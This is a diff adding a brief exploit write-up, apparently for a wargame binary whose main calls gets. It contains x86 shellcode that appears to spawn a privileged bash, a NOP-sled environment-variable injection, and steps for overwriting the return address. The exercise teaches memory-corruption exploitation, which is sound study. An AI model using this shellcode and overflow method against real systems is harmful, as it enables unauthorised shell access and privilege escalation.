@@ -1,0 +1,26 @@
+disassembly of the main gives:
+0x08048480      55             push ebp                                                                                     
+0x08048481      89e5           mov ebp, esp                                                                                 
+0x08048483      83e4f0         and esp, 0xfffffff0
+0x08048486      83ec50         sub esp, 0x50
+0x08048489      8d442410       lea eax, [s]
+0x0804848d      890424         mov dword [esp], eax        ; char *s                                                        
+0x08048490      e8abfeffff     call sym.imp.gets           ;[3] ; char *gets(char *s)                                       
+0x08048495      c9             leave                                                                                        
+0x08048496      c3             ret
+
+`gets` is called, which is unsafe, we can just overwrite the stack so that the ret returns on some address containing a shellcode.
+
+so:
+(This is some shellcode)
+echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" > shellcode
+
+(we put our shellcode in our environment, we also prepend it with a NOP slide to make it easier)
+export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 50000)'``cat shellcode`"
+
+go get the rough estimate of the position of the environment in the address space of the program:
+(in gdb)
+print getenv("SHELLCODE")
+
+We now can create some file, containing multiple times this address encoded in binary, that will be given as STDIN to the program.
+The gets will then read too much on the stack, putting our address in the popping position for the ret instruction.
